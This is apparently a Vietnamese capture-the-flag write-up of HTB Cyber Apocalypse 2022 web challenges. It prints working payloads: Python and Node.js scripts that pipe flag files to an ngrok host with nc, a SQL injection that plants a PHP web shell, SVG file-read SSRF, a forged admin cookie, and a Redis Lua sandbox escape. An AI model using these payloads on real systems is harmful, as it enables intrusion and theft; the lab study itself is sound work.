# HTB - Cyber Apocalypse 2022 <Web>

**Mục lục**:

cop lại full url

[Acnologia Portal](https://github.com/devme4f/ctf-writeup/blob/main/HTB-Cyber-Apocalypse-2022/acnologia_portal.md)
    
[Kryptos Support](https://github.com/devme4f/ctf-writeup/tree/main/HTB-Cyber-Apocalypse-2022#kryptos-support)
    
[Blinkerfluids](https://github.com/devme4f/ctf-writeup/tree/main/HTB-Cyber-Apocalypse-2022#blinkerfluids)
    
[Admidst Us](https://github.com/devme4f/ctf-writeup/tree/main/HTB-Cyber-Apocalypse-2022#admidst-us)
    
[Mutation Lab](https://github.com/devme4f/ctf-writeup/tree/main/HTB-Cyber-Apocalypse-2022#mutation-lab)
    
[Intergalactic Post](https://github.com/devme4f/ctf-writeup/tree/main/HTB-Cyber-Apocalypse-2022#intergalactic-post)
    
[Red Island](https://github.com/devme4f/ctf-writeup/tree/main/HTB-Cyber-Apocalypse-2022#red-island)
    
[Genesis Wallet](https://github.com/devme4f/ctf-writeup/tree/main/HTB-Cyber-Apocalypse-2022#genesis-wallet)
    
[Spiky Tamagotchy](https://github.com/devme4f/ctf-writeup/blob/main/HTB-Cyber-Apocalypse-2022#spiky-tamagotchy)

## Kryptos Support

Có chức năng report, XSS được cookies của moderator.

1. Có page settings có chức năng update password, khi điền vào `new password` 1 post request gồm json data gồm: new password + uuid .
2. Khi truy cập `/admin` bị redirect về lại.

Ta nghĩ ngay đến cần login as admin để được flag.

Với uuid hiện tại là 100 -> `{"new_pass":1, "uuid":1}` -> *change password successfully!!* ->  login: admin:1 --> flag

**flag**: `pass`

## Blinkerfluids

**Description**: Chall cho source code.

1. Website có tính năng viết invoice bằng *markdown*.

![Blinkerfluids theme](images/blinkerfluids_theme.png)

2. Invoice này sau đó có thể được export thành file `.pdf`.

![Blinkerfluids pdf](images/blinkerfluids_pdf.png)

Ở `helpers/MDHelpers.js`:
```js
const { mdToPdf }    = require('md-to-pdf')
```

Và ở file `package.json` ta biết được version: `{md-to-pdf": "4.1.0"}`

Làm vài đường google ta tìm được RCE RCE vulnerability của module *md-to-pdf*(CVE-2021–23639): https://github.com/simonhaenisch/md-to-pdf/issues/99

Ở comment ta nhặt được payload:
```
---js
{
    css: `body::before { content: "${require('fs').readFile('/flag.txt')}"; display: block }`,
}
---
```
Ở đây ta inject đoạn code được đọc dưới dạng code `nodejs` khi nằm trong tag `---js` từ đó đọc được file `/flag.txt`

????/

**flag**: `pass`

## Admidst Us

**Description**: Chall cho source code.

Nhảy vào ta thấy 1 website toàn ảnh, chẳng có mấy endpoint thú vị, review source code thôi.

Ở file `util.py`
```python
def make_alpha(data):
    color = data.get('background', [255,255,255])

    try:
        dec_img = base64.b64decode(data.get('image').encode())

        image = Image.open(BytesIO(dec_img)).convert('RGBA')
        img_bands = [band.convert('F') for band in image.split()]

# ...............

        new_bands = [
            ImageMath.eval(
                'convert((image - color) / alpha + color, "L")',
                image=img_bands[i],
                color=color[i],
                alpha=alpha
            )
            for i in range(3)
        ]

```
Đọc thấy hàm `eval()` là biết nguy hiểm chỗ này rồi, đặc biệt là tham số đầu vào `backgound`.

File `requirement.txt`:
```
wheel
Pillow==8.4.0
```

Thì nhận thấy Pillow==8.4.0 là 1 CVE hẳn hoi: https://security.snyk.io/vuln/SNYK-PYTHON-PILLOW-2331901


Edit source code để debug, dump error các thứ, try and fix lặp đi lặp lại ta build được đoạn code để exploit. Payload sẽ nạp vào 1 trong các giá trị rgb của tham số `background`(thấy eval cộng trừ chỗ này sôi nổi).

`exploit.py`:
```python
import requests


# 178.62.119.24:31192
# localhost:1337
url = 'http://178.62.119.24:31192'

headers = {
    'Content-Type': 'application/json'
}

data = {
    'image': 'base64_img_string_here',
    'background': ['__import__("os").system("cat /flag.txt | nc 0.tcp.ap.ngrok.io 17059")', 238, 245 ]
}

r = requests.post(url+'/api/alphafy', json=data, headers=headers)

print(r.text)
```

Bởi giá trị rgb này output là các màu đơn thuần, đây là Blind Command Injection nên ta gửi flag đến netcat hứng flag thôi.

**flag**: `HTB{i_slept_my_way_to_rce}`

## Mutation Lab

**Description**: Một bài black-box

1. Gửi svg lên server với syntax json: `{"svg": "....."}`, server return về 1 ảnh png --> SSRF
2. Cookies session là `{"username": "test"}` được base64_encode và session.sign tránh bị sửa đổi.
3. Main page hint phải là admin mới thấy được secret.
Dùng payload này để SSRF: https://security.snyk.io/vuln/SNYK-JS-CONVERTSVGTOPNG-2348244
```html
<?xml version="1.0" standalone="no"?> 
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd";> <svg width="640px" height="480px" version="1.1" xmlns="http://www.w3.org/2000/svg"; xmlns:xlink= "http://www.w3.org/1999/xlink";> 
<image xlink:href="file:///etc/passwd" ox="0" y="0" height="640px" width="480px"/> 
</svg>
```

Trigger `error` với payload `{"svg": null}` ta được các root directory chứa web app: 
```
/app/node_modules/convert-svg-core/src/Converter.js
/app/node_modules/convert-svg-core/src/API.js
/app/routes/index.js
/app/node_modules/express/lib/router/layer.js
/app/node_modules/express/lib/router/route.js
/app/node_modules/express/lib/router/index.js
```

Nhờ đó ta đọc được các file: `/app/index.js`, `/app/config.js`, `.env`(app nodejs hay có file .env chứa các biến môi trường sẵn sàng để export ra)....

Ta được *SECRET_KEY* của web app cũng như biết được app nodejs này dùng `cookie-session` để sign cookies.

Với *SECRET_KEY* ta viết được hàm sinh cookies admin.
```js
var cookieSession = require('cookie-session')
var express = require('express')

var app = express()


app.set('trust proxy', 1) // trust first proxy

app.use(cookieSession({
    name: 'session',
    keys: ['5921719c3037662e94250307ec5ed1db'] // secret key
}))

app.get('/', function(req, res, next) {
    req.session = {
        username: 'admin'
    }
    // console.log();
    return res.status(200).json({status: 'success'})
})

app.listen(3000)
```

Vậy ta đã được cookie với username là admin và đã được sign bởi `SECRET_KEY` leak được:
```
session=eyJ1c2VybmFtZSI6ImFkbWluIn0=&session.sig=EYdvy2mhVoEznETyhYjNYFFZM8o
```
Thế cookies admin, ta được flag:

**flag**: `pass`

## Intergalactic Post

**Description**: Chall cho source code

file `Database.php`:
```php
    public function subscribeUser($ip_address, $email)
    {   
        $results = $this->db->exec("INSERT INTO subscribers (ip_address, email) VALUES('$ip_address', '$email')");
        return $results;
    }
```
Rõ như ban ngày, ta có thể thấy web app dính lỗi SQL injection.

file `models/SubcriberModel.php` cho ta thấy 2 tham số `ip_address`, `email` được lấy từ đâu:
```php
# ............
    public function getSubscriberIP(){
        if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)){
            return  $_SERVER["HTTP_X_FORWARDED_FOR"];
        }else if (array_key_exists('REMOTE_ADDR', $_SERVER)) {
            return $_SERVER["REMOTE_ADDR"];
        }else if (array_key_exists('HTTP_CLIENT_IP', $_SERVER)) {
            return $_SERVER["HTTP_CLIENT_IP"];
        }
        return '';
    }

    public function subscribe($email)
    {
        $ip_address = $this->getSubscriberIP();
        return $this->database->subscribeUser($ip_address, $email);
        
    }
```

Payload All The Thing SQLi của SQLite: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#remote-command-execution-using-sqlite-command---attach-database

0. Flag nằm trong file `/flag{random_string}.txt` nên target bài này là  RCE thay vì chỉ đọc file.
1. Bởi query được nạp vào hàm `exec()`, hàm này có thể nhận nhiều query cùng 1 lúc(ngăn cách bởi `;`, thường dùng cho result-less query) và thực thi(khác với `query()`) nên ta có thể exploit `SQLi stacked queries`.
2. Bật docker test trên local với payload vừa có, thực thi `attach database` ta thấy có file được tạo, với PHP web app ta có thể tạo 1 file php rồi truy cập đến và RCE.

Mở BurpSuite đấm thôi, vì header `X-Forwarded-For` không bị filter gì, ta inject ngay chỗ này.
```
X-Forwarded-For: a','b'); ATTACH DATABASE '/www/lol.php' AS lol;CREATE TABLE lol.pwn (dataz text);INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>")-- -
```



http://ip:port/?cmd=ls%20-la$20/
http://ip:port/?cmd=cat%20flag_1d23c48aade7db8.txt

**flag**: `HTB{inj3ct3d_th3_tru7h}`

## Red Island

**Description**: Một bài black-box

Truy cập website sau khi register và login ta được 1 trang cho phép nộp 1 url chứa image và nó sẽ đỏ hóa cái ảnh rồi trả về.

Bị SSRF nên đọc được hầu hết file, đọc 1 số file như `package.json` hay `app.js` cũng như từ tên bài ta biết có combo gopher + redis.

Thử overwrite file `app.js` bằng gopher + redis thì với nodejs app cần restart server thì nó mới load lại thay đổi cho nên không ăn thua. Thử tiếp RCE cũng không được. Step bro am stuck!!.


**Exploit**:

Biết được redis có hàm eval: https://redis.io/commands/eval/

redis lua sandbox escape rce(CVE-2022-0543): https://developpaper.com/cve-2022-0543-redis-lua-sandbox-escape-rce/

RCE này không đến từ gopher hay redis mà đến từ linux từ nhà phân phối như Ubuntu/Debian/CentOS khi packaging redis, nó lỡ để lại 1 object package ở Lua sanbox. 
```lua
luaLoadLib(lua, LUA_LOADLIBNAME, luaopen_package);
```
Kẻ tấn công có thể dùng method của object này để load function từ dynamic link library liblua, từ đó escape sandbox và thực thi commands. Cơ bản là thế, nên đọc thêm các link trên.

**Payload**:
```
eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("uname -a", "r"); local res = f:read("*a"); f:close(); return res' 0
```

Đấm vào gopher và url encode thôi:
```
gopher://127.0.0.1:6379/_eval%20%27local%20io_l%20%3D%20package.loadlib%28%22%2Fusr%2Flib%2Fx86_64-linux-gnu%2Fliblua5.1.so.0%22%2C%20%22luaopen_io%22%29%3B%20local%20io%20%3D%20io_l%28%29%3B%20local%20f%20%3D%20io.popen%28%22cat%20/root/flag.txt%22%2C%20%22r%22%29%3B%20local%20res%20%3D%20f%3Aread%28%22%2Aa%22%29%3B%20f%3Aclose%28%29%3B%20return%20res%27%200
```

**flag**: `pass`

## Genesis Wallet
**Write up**: https://h1pmnh.github.io/post/ctf-htb-cyber-apolcalypse-web-genesis-wallet/

CSRF rest 2FA QRcode của admin và reverse proxy varnish dùng để caching cached lại page reset 2FA đó, truy cập đến trang này(edit lại Host: 127.0.0.1 fit với hash) và trộm QRcode thành công.

## Spiky Tamagotchy

**Write up**: https://gist.github.com/pich4ya/c033a1d147f8eb0348c10ed1a44fc2dc

Nodejs SQL injection trên prepare statement khi đầu vào input không được kiểm tra type dẫn đến auth bypass.

**root cause**: https://github.com/mysqljs/mysql/blob/master/Readme.md#escaping-query-values
```
Objects are turned into `key = 'val'` pairs for each enumerable property on the object. If the property's value is a function, it is skipped; if the property's value is an object, toString() is called on it and the returned value is used.
```

**input bypass authentication**: Thấy lần đầu SQLi trên prepare statement.
```json
{"username": "admin", "password": {"password": 1}}
```
**the prepared statement**:
```
SELECT username FROM users WHERE username = ? AND password = ?
```

**become**:
```
SELECT username FROM users WHERE username = 'admin' AND password = `password` = 1
```
Bypassed!!

**Sau khi login ta được cookies**:
```
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjUyOTc3Mzk4fQ.UwNx5sZlYOKO2TxS_l2lqO2WN_iYEzzc8cBOI06Ud8c
```
Kiến thức mới!!!

### node.js code injection => RCE

Sau khi login được ta exploit đoạn code calculate `eval()` sau, khá dễ khi mà ta đã được test trên local

file `/helpers/SpikyFactor.js`:
```js
const calculate = (activity, health, weight, happiness) => {
    return new Promise(async (resolve, reject) => {
        try {
            // devine formula :100:
            let res = `with(a='${activity}', hp=${health}, w=${weight}, hs=${happiness}) {
                if (a == 'feed') { hp += 1; w += 5; hs += 3; } if (a == 'play') { w -= 5; hp += 2; hs += 3; } if (a == 'sleep') { hp += 2; w += 3; hs += 3; } if ((a == 'feed' || a == 'sleep' ) && w > 70) { hp -= 10; hs -= 10; } else if ((a == 'feed' || a == 'sleep' ) && w < 40) { hp += 10; hs += 5; } else if (a == 'play' && w < 40) { hp -= 10; hs -= 10; } else if ( hs > 70 && (hp < 40 || w < 30)) { hs -= 10; }  if ( hs > 70 ) { m = 'kissy' } else if ( hs < 40 ) { m = 'cry' } else { m = 'awkward'; } if ( hs > 100) { hs = 100; } if ( hs < 5) { hs = 5; } if ( hp < 5) { hp = 5; } if ( hp > 100) { hp = 100; }  if (w < 10) { w = 10 } return {m, hp, w, hs}
                }`;
            quickMaths = new Function(res);
```

```python
import requests

url = 'http://ip:port/'
#s = requests.Session()

header = b'{"alg":"none","typ":"JWT"}'
payload = b'{"username":"admin"}'

cookies = {
    'session':'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjUyOTc3Mzk4fQ.UwNx5sZlYOKO2TxS_l2lqO2WN_iYEzzc8cBOI06Ud8c'
}

# https://whitehat.vn/threads/khai-thac-lo-hong-remote-code-execution-rce-trong-nodejs-phan-1.14697/
payload = "a', a=(eval(\"global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt|nc ngrok.io 1234')\")), b='a"

data = {
    'activity': payload,
    'health': '1',
    'weight': '1',
    'happiness': '1',
}

r = requests.post(url+'api/activity', data=data, cookies=cookies, allow_redirects=False)

print(r.text)
```

**flag**: `pass`

## Genesis Wallet's Revenge

## CheckpointBots
